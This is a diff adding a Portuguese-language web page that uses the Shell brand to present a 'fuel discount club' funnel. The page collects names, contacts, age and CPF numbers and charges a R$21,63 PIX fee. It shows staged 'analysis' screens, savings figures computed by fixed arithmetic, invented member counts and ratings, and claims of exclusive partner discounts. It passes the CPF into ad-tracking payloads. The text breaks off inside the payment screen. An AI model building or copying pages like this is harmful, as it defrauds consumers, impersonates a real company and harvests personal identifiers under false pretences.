@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Shell – Clube de Descontos em Combustível</title>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "697f7cb8f8ab7bf74f273005";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)
+}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', 'SEU_PIXEL_ID'); 
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=SEU_PIXEL_ID&ev=PageView&noscript=1"
+/></noscript>
+
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=DM+Sans:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --fuel: #E8B400;
+  --fuel2: #FF8C00;
+  --fuel-glow: rgba(232,180,0,0.22);
+  --green: #00C97A;
+  --green-glow: rgba(0,201,122,0.2);
+  --dark:  #0C0C0A;
+  --dark2: #141410;
+  --dark3: #1C1C16;
+  --card:  rgba(255,255,255,0.04);
+  --brd:   rgba(255,255,255,0.08);
+  --text:  #F5F2E8;
+  --muted: #8A8570;
+  --danger:#FF4D4D;
+  --r: 16px;
+  --t: 0.36s cubic-bezier(.4,0,.2,1);
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden;background:var(--dark);font-family:'DM Sans',sans-serif;color:var(--text)}
+
+/* ── PROGRESS ── */
+#pg-wrap{position:fixed;top:0;left:0;right:0;z-index:200;height:3px;background:rgba(255,255,255,0.06)}
+#pg-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--fuel2),var(--fuel));transition:width .55s cubic-bezier(.4,0,.2,1);box-shadow:0 0 8px var(--fuel-glow)}
+
+/* ── LOGO TOP ── */
+.top-logo {
+  position: fixed;
+  top: 16px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 48px;
+  height: 48px;
+  z-index: 150;
+  border-radius: 8px;
+  box-shadow: 0 0 15px var(--fuel-glow);
+  object-fit: cover;
+}
+
+/* ── SCREENS ── */
+#app{width:100%;height:100%;position:relative;overflow:hidden}
+.scr{
+  position:absolute;inset:0;
+  display:flex;flex-direction:column;align-items:center;
+  padding:20px 20px 28px;padding-top:80px; /* Ajustado para a logo */
+  opacity:0;transform:translateX(44px);
+  pointer-events:none;transition:opacity var(--t),transform var(--t);
+  overflow-y:auto;-webkit-overflow-scrolling:touch;
+}
+.scr.active{opacity:1;transform:translateX(0);pointer-events:all}
+.scr.exit{opacity:0;transform:translateX(-44px);pointer-events:none}
+.box{width:100%;max-width:440px;display:flex;flex-direction:column;gap:18px}
+
+/* ── TYPOGRAPHY ── */
+.tag{
+  display:inline-flex;align-items:center;gap:6px;
+  background:rgba(232,180,0,0.10);border:1px solid rgba(232,180,0,0.28);
+  color:var(--fuel);font-family:'Sora',sans-serif;font-size:10.5px;font-weight:700;
+  letter-spacing:.09em;text-transform:uppercase;padding:5px 12px;border-radius:100px;width:fit-content
+}
+.tag .dot{width:6px;height:6px;background:var(--fuel);border-radius:50%;animation:blink 1.6s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+h1{font-family:'Sora',sans-serif;font-weight:800;font-size:clamp(22px,5.8vw,30px);line-height:1.22;color:var(--text)}
+h1 em{font-style:normal;color:var(--fuel)}
+h1 .g{color:var(--green)}
+.sub{font-size:14.5px;color:var(--muted);line-height:1.65}
+.sub b{color:var(--text)}
+.nm{color:var(--fuel);font-weight:700}
+
+/* ── CARD ── */
+.card{background:var(--card);border:1px solid var(--brd);border-radius:var(--r);padding:18px}
+.divider{height:1px;background:var(--brd)}
+
+/* ── BUTTONS ── */
+.btn{
+  width:100%;padding:17px 22px;
+  background:linear-gradient(135deg,var(--fuel2),var(--fuel));
+  color:#000;font-family:'Sora',sans-serif;font-weight:700;font-size:15.5px;
+  border:none;border-radius:14px;cursor:pointer;
+  box-shadow:0 4px 22px var(--fuel-glow);
+  transition:transform .18s,opacity .18s;position:relative;overflow:hidden;
+  -webkit-user-select:none;user-select:none
+}
+.btn:active{transform:scale(.97)}
+.btn:disabled{opacity:.45;cursor:not-allowed;transform:none}
+.btn.sec{background:var(--card);color:var(--text);border:1px solid var(--brd);box-shadow:none;font-size:14px;padding:14px}
+
+/* ── INPUTS ── */
+.field{display:flex;flex-direction:column;gap:7px}
+.field label{font-size:12.5px;color:var(--muted);font-weight:500}
+.field input{
+  width:100%;padding:15px 14px;background:rgba(255,255,255,0.05);
+  border:1px solid var(--brd);border-radius:12px;
+  color:var(--text);font-family:'DM Sans',sans-serif;font-size:16px;
+  outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none
+}
+.field input:focus{border-color:var(--fuel);box-shadow:0 0 0 3px rgba(232,180,0,0.10)}
+.field input.er{border-color:var(--danger)}
+.emsg{font-size:12px;color:var(--danger);display:none}
+.emsg.show{display:block}
+
+/* ── OPTIONS ── */
+.opts{display:flex;flex-direction:column;gap:9px}
+.opt{
+  padding:13px 15px;background:var(--card);border:1px solid var(--brd);
+  border-radius:12px;cursor:pointer;transition:all .18s;
+  display:flex;align-items:center;gap:11px;font-size:14.5px;font-weight:500
+}
+.opt:active{transform:scale(.98)}
+.opt.sel{border-color:var(--fuel);background:rgba(232,180,0,0.07);box-shadow:0 0 0 1px rgba(232,180,0,0.25)}
+.chk{width:20px;height:20px;border-radius:50%;border:2px solid var(--brd);flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .18s}
+.opt.sel .chk{background:var(--fuel);border-color:var(--fuel)}
+.opt.sel .chk::after{content:'✓';font-size:10px;color:#000;font-weight:900}
+
+/* ── PROGRESS BAR (proc) ── */
+.pbwrap{background:var(--dark3);border-radius:100px;height:7px;overflow:hidden}
+.pb{height:100%;width:0%;background:linear-gradient(90deg,var(--fuel2),var(--fuel));border-radius:100px;transition:width .35s ease}
+.pmsg{font-size:13.5px;color:var(--muted);min-height:20px}
+
+/* ── RESULT ── */
+.res-box{
+  background:linear-gradient(135deg,rgba(0,201,122,0.10),rgba(0,180,100,0.04));
+  border:1px solid rgba(0,201,122,0.28);border-radius:var(--r);padding:22px;text-align:center
+}
+.res-val{font-family:'Sora',sans-serif;font-weight:800;font-size:clamp(26px,7.5vw,38px);color:var(--green);text-shadow:0 0 28px var(--green-glow)}
+.res-lbl{font-size:13px;color:var(--muted);margin-top:5px}
+
+/* economy bar */
+.eco-bar-wrap{background:var(--dark3);border-radius:100px;height:10px;overflow:hidden;margin-top:14px}
+.eco-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--green),#00FFB2);border-radius:100px;transition:width 1.2s cubic-bezier(.4,0,.2,1)}
+
+/* ── BENEFITS ── */
+.bens{display:flex;flex-direction:column;gap:10px}
+.ben{display:flex;align-items:flex-start;gap:11px;font-size:14px;line-height:1.5}
+.bico{width:28px;height:28px;border-radius:8px;background:rgba(232,180,0,0.10);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:14px}
+
+/* ── PRICE ── */
+.price-card{text-align:center;padding:18px}
+.p-old{font-size:13px;color:var(--muted);text-decoration:line-through}
+.p-new{font-family:'Sora',sans-serif;font-weight:800;font-size:40px;color:var(--text);line-height:1.1}
+.p-new sup{font-size:18px;vertical-align:top;margin-top:6px;display:inline-block}
+.p-new sub{font-size:18px;vertical-align:bottom}
+.p-type{font-size:12.5px;color:var(--muted);margin-top:4px}
+.badge{display:inline-block;background:var(--fuel);color:#000;font-size:11px;font-weight:700;padding:4px 11px;border-radius:100px;margin-top:7px}
+
+/* ── SECRET ── */
+.secret{border:1px dashed rgba(232,180,0,0.35);border-radius:var(--r);padding:20px;background:rgba(232,180,0,0.03);text-align:center}
+
+/* ── PIX / CHECKOUT ── */
+.pix-code{
+  background:var(--dark3);border:1px solid var(--brd);border-radius:12px;
+  padding:13px 14px;font-family:monospace;font-size:11px;color:var(--muted);
+  word-break:break-all;line-height:1.7;max-height:76px;overflow:hidden;position:relative
+}
+.pix-code::after{content:'';position:absolute;bottom:0;left:0;right:0;height:28px;background:linear-gradient(transparent,var(--dark3))}
+.qr-wrap{display:flex;justify-content:center;padding:14px;background:#fff;border-radius:12px}
+.qr-wrap img{width:176px;height:176px;display:block;border-radius:4px}
+
+/* ── TIMER ── */
+.timer{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px 15px;background:rgba(255,77,77,0.07);border:1px solid rgba(255,77,77,0.2);border-radius:10px}
+#tdisp{font-family:'Sora',sans-serif;font-weight:700;font-size:18px;color:var(--danger);min-width:50px;text-align:center}
+.tlbl{font-size:12.5px;color:var(--muted)}
+
+/* ── STATUS ── */
+.status{display:flex;align-items:center;gap:7px;justify-content:center;font-size:13px;color:var(--muted)}
+.sdot{width:8px;height:8px;border-radius:50%;background:var(--fuel);animation:blink 1.2s infinite}
+.sdot.ok{background:var(--green);animation:none}
+
+/* ── PROOF ── */
+.proof{display:flex;align-items:center;justify-content:center;gap:7px;font-size:11.5px;color:var(--muted)}
+.avts{display:flex}
+.av{width:22px;height:22px;border-radius:50%;border:2px solid var(--dark);margin-left:-5px;font-size:9px;font-weight:700;color:#000;display:flex;align-items:center;justify-content:center}
+.step-i{font-size:11.5px;color:var(--muted);text-align:center}
+
+/* mobile height fix */
+@media(max-height:680px){.scr{justify-content:flex-start;padding-top:84px}}
+</style>
+</head>
+<body>
+<div id="pg-wrap"><div id="pg-bar"></div></div>
+<img src="shell--600.png" class="top-logo" alt="Shell Logo">
+<div id="app"></div>
+<script>
+// ─── TRACKING & CAPI ENGINE ──────────────────────────────────────────────────
+function getCookie(name) {
+  let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+  return match ? match[2] : null;
+}
+
+function trackEvent(eventName, data = {}) {
+  try {
+    // 1. Browser Pixel FBQ
+    if (typeof fbq === 'function') {
+      const stdEvents = ['ViewContent', 'Lead', 'InitiateCheckout', 'AddPaymentInfo', 'Purchase'];
+      if (stdEvents.includes(eventName)) {
+        fbq('track', eventName, data);
+      } else {
+        fbq('trackCustom', eventName, data);
+      }
+    }
+
+    // 2. Conversion API (CAPI) via Vercel Serverless Function
+    let fbcValue = getCookie('_fbc') || '';
+    if (!fbcValue && window.location.search.includes('fbclid')) {
+      fbcValue = 'fb.1.' + Date.now() + '.' + new URLSearchParams(window.location.search).get('fbclid');
+    }
+
+    const payload = {
+      event_name: eventName,
+      event_id: 'eid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+      page_url: window.location.href,
+      user_agent: navigator.userAgent,
+      fbp: getCookie('_fbp') || '',
+      fbc: fbcValue,
+      cpf: state.cpf || '',
+      content_name: data.content_name || eventName,
+      value: data.value || 0,
+      currency: data.currency || 'BRL'
+    };
+
+    fetch('/api/capi', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(e => console.log('CAPI falhou silenciosamente', e));
+
+  } catch(e) {}
+}
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+const state = {
+  name:'', email:'', phone:'', cpf:'', age:'',
+  quiz:{ vehicles:'', fuel:'', spend:'' },
+  savings:{ min:0, max:0 },
+  transaction_id:'', pix_copia_e_cola:'', pix_qr_code:'', pix_base64:'',
+};
+
+// ─── PROGRESS MAP ────────────────────────────────────────────────────────────
+const PROG = [0,8,16,30,42,54,64,72,80,87,92,96,100];
+let CUR = 0;
+let _timer = null;
+
+// ─── ENGINE ──────────────────────────────────────────────────────────────────
+const app = document.getElementById('app');
+const pgBar = document.getElementById('pg-bar');
+
+function goTo(idx) {
+  const old = app.querySelector('.scr.active');
+  if (old) { old.classList.remove('active'); old.classList.add('exit'); setTimeout(()=>old.remove(), 400); }
+  CUR = idx;
+  pgBar.style.width = (PROG[idx] || 0) + '%';
+  const el = build(idx);
+  app.appendChild(el);
+  requestAnimationFrame(()=>requestAnimationFrame(()=>el.classList.add('active')));
+
+  // Trigger Pixel & CAPI por Etapa
+  const stepData = { content_name: 'Etapa_' + idx };
+  switch(idx) {
+    case 0: trackEvent('ViewContent', stepData); break;
+    case 1: trackEvent('StartLead_Nome', stepData); break;
+    case 2: trackEvent('Lead_Quiz', stepData); break;
+    case 3: trackEvent('Lead_Idade', stepData); break;
+    case 4: trackEvent('Lead_Contato', stepData); break;
+    case 5: trackEvent('Lead', stepData); break; // Lead concluído após enviar contato
+    case 6: trackEvent('ViewResult', stepData); break;
+    case 7: trackEvent('ViewSecret', stepData); break;
+    case 8: trackEvent('InitiateCheckout', { content_name: 'Oferta_Shell', value: 21.63, currency: 'BRL' }); break;
+    case 9: trackEvent('AddPaymentInfo_CPF', stepData); break;
+    case 10: trackEvent('AddPaymentInfo', { content_name: 'Gerando_PIX', value: 21.63, currency: 'BRL' }); break;
+    case 11: trackEvent('Purchase', { content_name: 'Acesso_Shell', value: 21.63, currency: 'BRL' }); break; // Purchase ao gerar PIX
+  }
+}
+
+// ─── HELPERS ─────────────────────────────────────────────────────────────────
+function cap(s){ return s ? s.charAt(0).toUpperCase()+s.slice(1).toLowerCase() : ''; }
+function onlyNums(s){ return s.replace(/\D/g,''); }
+function validEmail(e){ return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(e.trim()); }
+function validCPF(c){
+  c = onlyNums(c);
+  if(c.length!==11||/^(\d)\1+$/.test(c)) return false;
+  let s=0; for(let i=0;i<9;i++) s+=+c[i]*(10-i); let r=s%11; let d1=r<2?0:11-r;
+  if(+c[9]!==d1) return false;
+  s=0; for(let i=0;i<10;i++) s+=+c[i]*(11-i); r=s%11; let d2=r<2?0:11-r;
+  return +c[10]===d2;
+}
+function calcSavings(){
+  let base = 60;
+  if(state.quiz.spend==='200-500') base=80;
+  else if(state.quiz.spend==='500-1000') base=140;
+  else if(state.quiz.spend==='+1000') base=200;
+  if(state.quiz.vehicles==='2') base+=20;
+  else if(state.quiz.vehicles==='3+') base+=40;
+  state.savings.min = base + 10;
+  state.savings.max = base + 120;
+}
+
+// ─── BUILDER ROUTER ──────────────────────────────────────────────────────────
+function build(idx){
+  const s = document.createElement('div');
+  s.className = 'scr';
+  const fn = [s0,s1,s2,s3,s4,s5,s6,s7,s8,s9,s10,s11][idx];
+  return fn ? fn(s) : s;
+}
+
+// ─── S0 – HOOK ───────────────────────────────────────────────────────────────
+function s0(s){
+  s.innerHTML=`<div class="box">
+    <div class="tag"><span class="dot"></span>Análise gratuita</div>
+    <h1>Você pode estar <em>pagando mais caro no combustível</em> sem perceber</h1>
+    <p class="sub">Descubra quanto você pode <b>economizar por mês</b> com descontos exclusivos em postos parceiros.</p>
+    <div class="card">
+      <div class="bens">
+        <div class="ben"><div class="bico">⛽</div><div>Análise personalizada do seu consumo</div></div>
+        <div class="ben"><div class="bico">🏷️</div><div>Cupons exclusivos em postos parceiros</div></div>
+        <div class="ben"><div class="bico">🔒</div><div>100% seguro e privado</div></div>
+      </div>
+    </div>
+    <button class="btn" id="b0">Descobrir minha economia agora →</button>
+    <div class="proof">
+      <div class="avts">
+        <div class="av" style="background:#E8B400">M</div>
+        <div class="av" style="background:#FF8C00">J</div>
+        <div class="av" style="background:#00C97A">R</div>
+        <div class="av" style="background:#4EA8DE">A</div>
+      </div>
+      <span>+8.700 motoristas economizando este mês</span>
+    </div>
+  </div>`;
+  s.querySelector('#b0').onclick=()=>goTo(1);
+  return s;
+}
+
+// ─── S1 – NOME ───────────────────────────────────────────────────────────────
+function s1(s){
+  s.innerHTML=`<div class="box">
+    <div class="step-i">Passo 1 de 8</div>
+    <h1>Como podemos <em>te chamar?</em></h1>
+    <p class="sub">Sua análise será personalizada com base no seu perfil de consumo.</p>
+    <div class="field">
+      <label>Nome e sobrenome</label>
+      <input type="text" id="iname" placeholder="Digite seu nome..." autocomplete="given-name">
+      <span class="emsg" id="ename">Por favor, insira seu nome.</span>
+    </div>
+    <button class="btn" id="b1" disabled>Continuar →</button>
+  </div>`;
+  const inp=s.querySelector('#iname'), btn=s.querySelector('#b1'), err=s.querySelector('#ename');
+  inp.oninput=()=>{ inp.classList.remove('er'); err.classList.remove('show'); btn.disabled=inp.value.trim().length<2; };
+  inp.onkeydown=e=>{ if(e.key==='Enter'&&!btn.disabled) btn.click(); };
+  btn.onclick=()=>{
+    const v=inp.value.trim();
+    if(v.length<2){ inp.classList.add('er'); err.classList.add('show'); return; }
+    btn.disabled=true; state.name=cap(v); goTo(2);
+  };
+  setTimeout(()=>inp.focus(),500);
+  return s;
+}
+
+// ─── S2 – QUIZ ───────────────────────────────────────────────────────────────
+function s2(s){
+  const qs=[
+    { key:'vehicles', txt:`Quantos veículos você possui, <span class="nm">${state.name}</span>?`,
+      opts:[['1','🚗 1 veículo'],['2','🚗🚗 2 veículos'],['3+','🚛 3 ou mais']] },
+    { key:'fuel', txt:'Qual combustível você usa mais?',
+      opts:[['gasolina','⛽ Gasolina'],['etanol','🌿 Etanol'],['diesel','🚚 Diesel'],['flex','🔀 Flex (varia)']] },
+    { key:'spend', txt:'Quanto gasta em média com combustível por mês?',
+      opts:[['ate200','Até R$ 200'],['200-500','R$ 200 – R$ 500'],['500-1000','R$ 500 – R$ 1.000'],['+1000','Acima de R$ 1.000']] },
+  ];
+  let qi=0;
+  const ans={...state.quiz};
+  function render(){
+    const q=qs[qi];
+    s.innerHTML=`<div class="box">
+      <div class="step-i">Pergunta ${qi+1} de ${qs.length}</div>
+      <h1>${q.txt}</h1>
+      <div class="opts">${q.opts.map(([v,l])=>`<div class="opt${ans[q.key]===v?' sel':''}" data-v="${v}"><div class="chk"></div><span>${l}</span></div>`).join('')}</div>
+      <button class="btn" id="bq" ${ans[q.key]?'':'disabled'}>Continuar →</button>
+    </div>`;
+    const btn=s.querySelector('#bq');
+    s.querySelectorAll('.opt').forEach(el=>{
+      el.onclick=()=>{ s.querySelectorAll('.opt').forEach(x=>x.classList.remove('sel')); el.classList.add('sel'); ans[q.key]=el.dataset.v; btn.disabled=false; };
+    });
+    btn.onclick=()=>{ if(!ans[q.key]) return; btn.disabled=true; state.quiz[q.key]=ans[q.key]; qi++; qi<qs.length?render():goTo(3); };
+  }
+  render(); return s;
+}
+
+// ─── S3 – FAIXA ETÁRIA ──────────────────────────────────────────────────────
+function s3(s){
+  s.innerHTML=`<div class="box">
+    <div class="step-i">Quase lá!</div>
+    <h1>Para <em>melhorar a precisão</em> da análise</h1>
+    <p class="sub">Selecione sua faixa de idade, <span class="nm">${state.name}</span>:</p>
+    <div class="opts">
+      ${[['18-24','18 a 24 anos'],['25-34','25 a 34 anos'],['35-44','35 a 44 anos'],['45+','45 anos ou mais']]
+        .map(([v,l])=>`<div class="opt" data-v="${v}"><div class="chk"></div><span>${l}</span></div>`).join('')}
+    </div>
+    <button class="btn" id="b3" disabled>Continuar →</button>
+  </div>`;
+  const btn=s.querySelector('#b3');
+  s.querySelectorAll('.opt').forEach(el=>{ el.onclick=()=>{ s.querySelectorAll('.opt').forEach(x=>x.classList.remove('sel')); el.classList.add('sel'); state.age=el.dataset.v; btn.disabled=false; }; });
+  btn.onclick=()=>{ btn.disabled=true; goTo(4); };
+  return s;
+}
+
+// ─── S4 – CONTATO ─────────────────────────────────────────────────────────────
+function s4(s){
+  s.innerHTML=`<div class="box">
+    <div class="step-i">Finalizando análise</div>
+    <h1>Onde enviar seu <em>resultado?</em></h1>
+    <p class="sub">Estamos finalizando sua análise personalizada de economia, <span class="nm">${state.name}</span>.</p>
+    <div class="field">
+      <label>E-mail</label>
+      <input type="email" id="iemail" placeholder="seu@email.com" autocomplete="email" inputmode="email">
+      <span class="emsg" id="eemail">E-mail inválido.</span>
+    </div>
+    <div class="field">
+      <label>WhatsApp / Telefone</label>
+      <input type="tel" id="iphone" placeholder="(11) 91234-5678" autocomplete="tel" inputmode="numeric">
+      <span class="emsg" id="ephone">Número inválido (mínimo 10 dígitos).</span>
+    </div>
+    <button class="btn" id="b4" disabled>Ver meu resultado →</button>
+    <p style="font-size:11px;color:var(--muted);text-align:center">🔒 Dados protegidos · Sem spam</p>
+  </div>`;
+  const ei=s.querySelector('#iemail'), pi=s.querySelector('#iphone');
+  const ee=s.querySelector('#eemail'), ep=s.querySelector('#ephone');
+  const btn=s.querySelector('#b4');
+  function chk(){ btn.disabled=!(ei.value.trim()&&pi.value.replace(/\D/g,'').length>=10); }
+  ei.oninput=()=>{ ei.classList.remove('er'); ee.classList.remove('show'); chk(); };
+  pi.oninput=()=>{ pi.value=onlyNums(pi.value).slice(0,11); pi.classList.remove('er'); ep.classList.remove('show'); chk(); };
+  btn.onclick=()=>{
+    let ok=true;
+    if(!validEmail(ei.value)){ ei.classList.add('er'); ee.classList.add('show'); ok=false; }
+    if(onlyNums(pi.value).length<10){ pi.classList.add('er'); ep.classList.add('show'); ok=false; }
+    if(!ok) return;
+    btn.disabled=true; state.email=ei.value.trim(); state.phone=onlyNums(pi.value); goTo(5);
+  };
+  return s;
+}
+
+// ─── S5 – PROCESSAMENTO ──────────────────────────────────────────────────────
+function s5(s){
+  s.innerHTML=`<div class="box" style="gap:22px">
+    <div class="tag"><span class="dot"></span>Processando</div>
+    <h1>Analisando seu <em>perfil de consumo</em></h1>
+    <div class="card" style="display:flex;flex-direction:column;gap:14px">
+      <div class="pbwrap"><div class="pb" id="ppb"></div></div>
+      <div class="pmsg" id="ppm">Iniciando análise...</div>
+    </div>
+    <div class="card">
+      <div class="bens">
+        <div class="ben"><div class="bico">⛽</div><div>Analisando consumo mensal...</div></div>
+        <div class="ben"><div class="bico">🗺️</div><div>Buscando parcerias com postos na sua região...</div></div>
+        <div class="ben"><div class="bico">💰</div><div>Calculando economia potencial...</div></div>
+      </div>
+    </div>
+  </div>`;
+  calcSavings();
+  const pb=s.querySelector('#ppb'), pm=s.querySelector('#ppm');
+  const steps=[[0,'Iniciando análise...'],[18,'Analisando consumo mensal...'],[36,'Buscando parcerias com postos na sua região...'],[58,'Cruzando dados do seu perfil...'],[74,'Calculando economia potencial...'],[88,'Preparando resultado personalizado...'],[96,'Finalizando...']];
+  let i=0;
+  function tick(){ if(i>=steps.length){ setTimeout(()=>goTo(6),500); return; } const[p,m]=steps[i]; pb.style.width=p+'%'; pm.textContent=m; i++; setTimeout(tick,i===1?350:680); }
+  setTimeout(tick,250);
+  return s;
+}
+
+// ─── S6 – RESULTADO ──────────────────────────────────────────────────────────
+function s6(s){
+  s.innerHTML=`<div class="box">
+    <div class="tag"><span class="dot"></span>Resultado pronto</div>
+    <h1><em>${state.name}</em>, sua análise está pronta!</h1>
+    <div class="res-box">
+      <div style="font-size:13px;color:var(--muted);margin-bottom:6px">Você pode economizar em combustível</div>
+      <div class="res-val" id="rval">R$ 0</div>
+      <div class="res-lbl">por mês com descontos exclusivos em postos</div>
+      <div class="eco-bar-wrap"><div class="eco-bar" id="ebar"></div></div>
+    </div>
+    <div class="card">
+      <div style="font-size:12.5px;color:var(--muted);margin-bottom:11px">📋 Com base nas suas respostas:</div>
+      <div class="bens">
+        <div class="ben"><div class="bico">🚗</div><div>Perfil com ${state.quiz.vehicles} veículo${state.quiz.vehicles!=='1'?'s':''} identificado</div></div>
+        <div class="ben"><div class="bico">⛽</div><div>Consumo de ${state.quiz.fuel||'combustível'} analisado</div></div>
+        <div class="ben"><div class="bico">📊</div><div>Potencial de economia acima da média nacional</div></div>
+      </div>
+    </div>
+    <button class="btn" id="b6">Ver como acessar esses descontos →</button>
+  </div>`;
+  const rv=s.querySelector('#rval'), eb=s.querySelector('#ebar');
+  const target=state.savings.max;
+  let cur=0; const st=Date.now(); const dur=1100;
+  function count(){ const p=Math.min(1,(Date.now()-st)/dur); cur=Math.round(p*target); rv.textContent=`R$ ${state.savings.min} – R$ ${cur}`; if(p<1) requestAnimationFrame(count); else rv.textContent=`R$ ${state.savings.min} – R$ ${target}`; }
+  setTimeout(count,300);
+  setTimeout(()=>{ eb.style.width=Math.min(95,Math.round((state.savings.max/350)*100))+'%'; },400);
+  s.querySelector('#b6').onclick=()=>goTo(7);
+  return s;
+}
+
+// ─── S7 – QUEBRA DE PADRÃO ───────────────────────────────────────────────────
+function s7(s){
+  s.innerHTML=`<div class="box">
+    <div class="secret">
+      <div style="font-size:36px;margin-bottom:8px">🔐</div>
+      <h1 style="font-size:21px">Esses descontos <em>não estão disponíveis</em> diretamente nos postos</h1>
+      <p class="sub" style="margin-top:11px">Eles fazem parte de <b>parcerias exclusivas</b> com redes de combustível — acessíveis apenas para membros cadastrados.</p>
+    </div>
+    <div class="card">
+      <div class="bens">
+        <div class="ben"><div class="bico">🚫</div><div>Não disponível para o público geral</div></div>
+        <div class="ben"><div class="bico">✅</div><div>Exclusivo para membros do Shell</div></div>
+        <div class="ben"><div class="bico">🔄</div><div>Novos postos e descontos adicionados toda semana</div></div>
+      </div>
+    </div>
+    <button class="btn" id="b7">Quero meu acesso exclusivo →</button>
+  </div>`;
+  s.querySelector('#b7').onclick=()=>goTo(8);
+  return s;
+}
+
+// ─── S8 – OFERTA ─────────────────────────────────────────────────────────────
+function s8(s){
+  s.innerHTML=`<div class="box">
+    <div class="tag"><span class="dot"></span>Oferta exclusiva</div>
+    <h1>Ative seu acesso ao <em>Shell</em> – Clube de Descontos em Combustível</h1>
+    <div class="card price-card">
+      <div class="p-old">Acesso avulso: R$ 49,90</div>
+      <div class="p-new"><sup>R$</sup>21<sub>,63</sub></div>
+      <div class="p-type">ativação única · sem mensalidade</div>
+      <div class="badge">⚡ Oferta por tempo limitado</div>
+    </div>
+    <div class="card">
+      <div style="font-size:12.5px;color:var(--muted);margin-bottom:11px">O que você recebe ao ativar:</div>
+      <div class="bens">
+        <div class="ben"><div class="bico">⛽</div><div><b>Descontos exclusivos</b> em postos parceiros da sua região</div></div>
+        <div class="ben"><div class="bico">💸</div><div><b>Economia de R$ ${state.savings.min}–R$ ${state.savings.max}/mês</b> no seu combustível</div></div>
+        <div class="ben"><div class="bico">⚡</div><div><b>Acesso imediato</b> após confirmação do pagamento</div></div>
+        <div class="ben"><div class="bico">🔄</div><div><b>Atualizações frequentes</b> de postos e promoções</div></div>
+      </div>
+    </div>
+    <button class="btn" id="b8">Quero ativar meu acesso 🚀</button>
+    <div class="proof"><span>⭐⭐⭐⭐⭐ 4.8 · Mais de 8.700 motoristas ativos</span></div>
+  </div>`;
+  s.querySelector('#b8').onclick=()=>goTo(9);
+  return s;
+}
+
+// ─── S9 – CPF ────────────────────────────────────────────────────────────────
+function s9(s){
+  s.innerHTML=`<div class="box">
+    <h1>Quase lá, <em>${state.name}!</em></h1>
+    <p class="sub">Para gerar seu acesso e liberar o pagamento via <b>PIX</b>, confirme seu CPF.</p>
+    <div class="card" style="display:flex;align-items:center;gap:11px">
+      <span style="font-size:22px">🔒</span>
+      <span style="font-size:12.5px;color:var(--muted)">CPF usado apenas para identificação do pagamento. Dados criptografados.</span>
+    </div>
+    <div class="field">
+      <label>CPF (somente números)</label>
+      <input type="tel" id="icpf" placeholder="00000000000" inputmode="numeric" maxlength="11">
+      <span class="emsg" id="ecpf">CPF inválido. Verifique os dígitos.</span>
+    </div>
+    <button class="btn" id="b9" disabled>Gerar meu PIX →</button>
+  </div>`;
+  const inp=s.querySelector('#icpf'), btn=s.querySelector('#b9'), err=s.querySelector('#ecpf');
+  inp.oninput=()=>{ inp.value=onlyNums(inp.value).slice(0,11); inp.classList.remove('er'); err.classList.remove('show'); btn.disabled=inp.value.length<11; };
+  btn.onclick=()=>{
+    if(!validCPF(inp.value)){ inp.classList.add('er'); err.classList.add('show'); return; }
+    btn.disabled=true; btn.textContent='Processando...'; state.cpf=onlyNums(inp.value); goTo(10);
+  };
+  return s;
+}
+
+// ─── S10 – CRIAR TRANSAÇÃO ──────────────────────────────────────────────────
+function s10(s){
+  s.innerHTML=`<div class="box" style="align-items:center;text-align:center;gap:22px">
+    <div style="font-size:46px">⚡</div>
+    <h1>Gerando seu <em>PIX</em>...</h1>
+    <p class="sub">Criando sua cobrança exclusiva. Aguarde alguns segundos.</p>
+    <div class="card" style="width:100%;display:flex;flex-direction:column;gap:12px">
+      <div class="pbwrap"><div class="pb" id="apb"></div></div>
+      <div class="pmsg" id="apm">Conectando ao servidor de pagamento...</div>
+    </div>
+    <div id="aerr" style="display:none;width:100%" class="card">
+      <p style="color:var(--danger);font-size:13.5px;margin-bottom:12px">⚠️ Não foi possível gerar a cobrança. Verifique os dados e tente novamente.</p>
+      <button class="btn" id="retry">Tentar novamente</button>
+    </div>
+  </div>`;
+  s.querySelector('#retry').onclick=()=>goTo(10);
+  const pb=s.querySelector('#apb'), pm=s.querySelector('#apm'), errBox=s.querySelector('#aerr');
+  const apiMsgs=['Conectando ao servidor...','Verificando seus dados...','Criando cobrança PIX...','Quase pronto...'];
+  let mi=0;
+  const mInt=setInterval(()=>{ if(mi<apiMsgs.length) pm.textContent=apiMsgs[mi++]; },750);
+  let fake=0; const fInt=setInterval(()=>{ fake=Math.min(fake+7,82); pb.style.width=fake+'%'; },350);
+
